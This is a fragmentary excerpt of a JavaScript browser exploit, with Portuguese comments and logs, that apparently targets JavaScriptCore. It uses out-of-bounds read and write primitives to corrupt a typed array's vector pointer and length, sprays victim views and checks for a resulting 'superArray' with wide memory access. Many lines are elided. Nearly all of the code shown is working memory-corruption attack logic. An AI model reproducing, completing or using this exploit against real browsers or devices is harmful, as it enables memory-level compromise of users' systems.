...
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10.5.1"; // Versão atualizada para rastreamento
...
// ============================================================
// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.5.1)
// (Baseada na v10.5 que produziu o log de sucesso de controle de m_vector/m_length)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.useCorruptedView_v10.5.1`;
    ...
    try {
        ...
        try {
            ...
            console.error(`Erro lendo SID pré-corrupção:`, e);
        }
        ...
        let sid_after_final_corruption = 0;
        let abv_vector_after = null;
        let abv_length_after = 0;

        try { sid_after_final_corruption = oob_read_absolute(TARGET_VIEW_METADATA_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET, 4); } catch(e){ console.error("Erro lendo sid_after_final_corruption:", e); }
        try { abv_vector_after = oob_read_absolute(m_vector_addr_in_oob, 8); } catch(e) { console.error("Erro lendo abv_vector_after:", e); } 
        try { abv_length_after = oob_read_absolute(m_length_addr_in_oob, 4); } catch(e) { console.error("Erro lendo abv_length_after:", e); } 
        ...
        logS3(`        m_vector:     ${isAdvancedInt64Object(abv_vector_after) ? abv_vector_after.toString(true) : "Erro Leitura ou valor inválido"} (Controlado para: ${toHex(PLANT_MVECTOR_HIGH_PART,32,false)}_${toHex(PLANT_MVECTOR_LOW_PART,32,false)})`, "leak", FNAME_CURRENT_TEST);
        ...
        if (typeof abv_length_after === 'number' && abv_length_after === 0xFFFFFFFF &&
            ...
            if (sid_after_final_corruption === EXPECTED_UINT32ARRAY_STRUCTURE_ID && EXPECTED_UINT32ARRAY_STRUCTURE_ID !== (0xBADBAD00 | 33) ) {
            ...
            if (abv_vector_after.isZero()) {
                ...
                try { original_val_at_marker = oob_read_absolute(MARKER_TEST_OFFSET_IN_OOB, 4); } catch(e){ console.error("Erro lendo original_val_at_marker:", e); }
                    ...
                    try {
                        if (sprayedVictimViews[i][MARKER_TEST_INDEX] === MARKER_VALUE) {
                            ...
                            if (sid_offset_for_superarray_read % 4 === 0) {
                                ...
                                if (sid_read_by_superarray !== 0 && sid_read_by_superarray === EXPECTED_UINT32ARRAY_STRUCTURE_ID && EXPECTED_UINT32ARRAY_STRUCTURE_ID !== (0xBADBAD00|33)) {
                                     logS3(`                CONFIRMADO: SID lido pelo superArray corresponde ao SID esperado REAL!`, "vuln", FNAME_CURRENT_TEST);
                                }
                            }
                            break; 
                        }
                    } catch (e_access) { /* Ignora acessos inválidos durante a varredura */ }
                }
                try { oob_write_absolute(MARKER_TEST_OFFSET_IN_OOB, original_val_at_marker, 4); } catch(e){ console.error("Erro restaurando original_val_at_marker:", e); }
            ...
            logS3(`    Valores obtidos: m_length=${toHex(abv_length_after)}, m_vector.low=${isAdvancedInt64Object(abv_vector_after) ? toHex(abv_vector_after.low()) : 'N/A'}, m_vector.high=${isAdvancedInt64Object(abv_vector_after) ? toHex(abv_vector_after.high()) : 'N/A'}`, "debug", FNAME_CURRENT_TEST);
        }
        ...
        if (e.stack) {
            logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        }
